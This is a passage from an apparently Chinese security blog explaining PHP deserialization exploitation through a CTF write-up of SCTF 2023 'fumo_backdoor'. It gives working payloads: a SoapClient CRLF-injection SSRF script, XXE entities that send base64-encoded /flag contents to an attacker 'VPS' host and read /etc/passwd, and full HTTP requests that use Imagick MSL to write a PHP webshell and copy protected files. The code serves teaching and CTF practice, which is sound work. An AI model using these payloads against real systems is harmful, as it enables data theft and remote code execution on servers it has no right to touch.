src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676533896472.png" style="zoom:80%;" /><h5 id="CRLF注入任意POST数据"><a href="#CRLF注入任意POST数据" class="headerlink" title="CRLF注入任意POST数据"></a>CRLF注入任意POST数据</h5><p>Content-Type不是可控的，但可以通过User-Agent伪造ContentType实现任意POST请求。</p><p>注：Content-Length也需要注入。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:5555/path';</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'data=something'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie: PHPSESSID=123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'Squirt1e^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">not_exists_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h4><p>构造器的差异造成的反序列化。</p><ul><li>ini_set(‘session.serialize_handler’,’php_serialize’);</li><li>ini_set(‘session.serialize_handler’,’php’);</li></ul><p>像这种就可控。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'baby'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d0g3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>————————————————————————————————————————————————————————<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$a=session_start  POST: serialize_handler=pphp_serialize</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于php_serialize构造器，序列化数据前面要加个’|’。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535834714.png"></p><p>然后使用php构造器就能反序列化了，因为php构造器分割键为’|’。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1676535938182.png"></p><h3 id="可实例化类new-class-argv"><a href="#可实例化类new-class-argv" class="headerlink" title="可实例化类new $class($argv);"></a>可实例化类new $class($argv);</h3><p>如果仅仅是可实例化任意类，并且能接受参数，那么此时该如何利用呢？其实无非就是找自定义类、内置类或者扩展类。</p><h4 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h4><p>实例化类时会触发构造函数，那么就会触发里面的代码。如果<code>xxx</code>为可以利用的函数，那么自然可以攻击。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// xxx</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般不会出现这样的情况，即便目标服务中有这样的恶意类，但可能由于没有<code>include</code>而无法调用。</p><p>通过<code>php</code>中的自动加载函数可以找到全局自定义的类。因此利用面就从单个文件扩展到整个项目，前提是有注册回调<code>spl_autoload_register</code>或定义来设置的<code>__autoload</code>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token string">'./../classes/'</span> <span class="token punctuation">.</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$class_name</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h4><p>内置类很多，但如果只能传递一个参数并且不对创建的对象进行方法调用，那么就很难找到合适的内置类了。</p><h5 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h5><p><code>SplFileObject</code>实现了一个允许连接到任何本地或远程 URL 的构造函数。可以通过该类实现SSRF。</p><p><code>PHP &lt; 8</code> 中的 <code>SSRF</code> 可以通过 <code>Phar</code> 协议技术转化为反序列化。</p><p>因此，满足以下条件即可：</p><ol><li>可上传文件，且路径已知。</li><li>存在<code>pop</code>链</li></ol><h5 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h5><p>该类接收<code>3</code>个参数。</p><p>通过设置第三个参数<code>dataIsURL</code>为<code> true</code>可以实现远程<code>xml</code>文件的加载。第二个参数的常量值设置为<code>2</code>即可。第一个参数 <code>data</code> 用于引入的外部实体的<code>url</code>。因此我们可以通过它打个XXE。</p><p><strong>evil.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype">&lt;!DOCTYPE try[&lt;!ENTITY % remote SYSTEM "https://VPS/send.xml"></span>%remote;%all;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>send.xml</strong></p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % all "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'https://VPS/?%payload;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也可以直接读文件，就不需要第三个参数了。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=\"1.0\"?></span><span class="token doctype">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM \"file:///etc/passwd\"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h4><h5 id="Magick"><a href="#Magick" class="headerlink" title="Magick"></a>Magick</h5><p><code>Imagick</code>拓展类是用于处理图像的，它是通过<code>Magick Scripting Language</code>语法来处理的。</p><p>这个语法可以用来写、转移文件，难点在于它只支持图片格式，如果不是它支持的图片格式的话就报错。</p><p>通过检索可知利用<code>ppm</code>图像文件格式的特点，可在末尾插入序列化数据而不影响图片的正常解析，这个东西就很妙。</p><p>例如<code>SCTF 2023</code>的<code>fumo_backdoor</code>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token string">":/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"FUNC_LIST"</span><span class="token punctuation">,</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[flag]/m'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>             <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token constant">FUNC_LIST</span><span class="token punctuation">[</span><span class="token string">"internal"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">argv</span><span class="token punctuation">;</span>            <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">;</span>                        <span class="token keyword">new</span> <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">'unserialze'</span><span class="token punctuation">:</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'rm'</span><span class="token punctuation">:</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"rm -rf /tmp 2>/dev/null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里如果<code>web</code>目录可写，我们可以直接写马。</p><p>通过<code>vid</code>模式，我们可以包含未知名称的<code>MSL</code>格式的临时文件，从而触发<code>MSL</code>语法达到写的目的。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$webshell</span> <span class="token operator">=</span> <span class="token string">"&lt;?php system('ls');?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$webshell</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据包</strong></p><pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 710<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4=" /> &lt;write filename="/var/www/html/b.php" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RCE</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795236160.png" alt="1687795236160"></p><p>当然，一般情况下<code>web</code>目录没法写，这题也是，只不过为了测试改了权限。</p><p>此题的正确解法是想办法触发<code>__sleep</code>从而把<code>flag</code>读出来。</p><p>要触发<code>__sleep</code>必须要序列化，因此该题只能搞个<code>session</code>序列化从而触发<code>__sleep</code>了。</p><p>而<code>php</code>的<code>session</code>是在<code>tmp</code>目录下存放的，该目录一般都可写，并且名称是可控的。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span>           <span class="token comment" spellcheck="true">//生成ppm格式的session内容</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$fumo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fumo_backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fumo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token string">"/tmp/squirt1e"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//readfile读取的文件，此时是空的。</span><span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token string">"|"</span> <span class="token punctuation">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fumo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据包</strong></p><pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1<span class="token header-name keyword">Host:</span> 127.0.0.1:18080<span class="token header-name keyword">Cache-Control:</span> max-age=0<span class="token header-name keyword">Content-Length:</span> 709<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979--------------------------c32aaddf3d8fd979<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"<span class="token header-name keyword">Content-Type:</span> application/octet-stream&lt;?xml version="1.0" encoding="UTF-8"?>&lt;image> &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBfE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czoxMzoiL3RtcC9zcXVpcnQxZSI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=" /> &lt;write filename="/tmp/sess_squirt1e" />&lt;/image>--------------------------c32aaddf3d8fd979--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写成功。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795786583.png" alt="1687795786583"></p><p>接下来就要把<code>flag</code>带到<code>/tmp/squirt1e</code>中，因为题目设置了<code>open_basedir</code>，没办法直接读。我们需要找到一个对文件头要求不严格的文件协议并手动指定，因为<code>flag</code>不是图片，通过<code>Imagick</code>移动会导致报错。</p><p>最终发现<code>mvg</code>、<code>uyvy</code>、<code>RGB</code>三种格式可以利用。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687796509728.png" alt="1687796509728"></p><p>前两个亲测可用。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/tmp/squirt1e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个参考作者的<code>exp</code>没成功，记录一下吧，万一以后用得到呢。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- step2: copy flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 设置为RGB格式，读取flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 设置⼀个空图⽚ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!-- 将空图⽚和flag数据进⾏拼接 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 添加偏移后，读取flag --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token 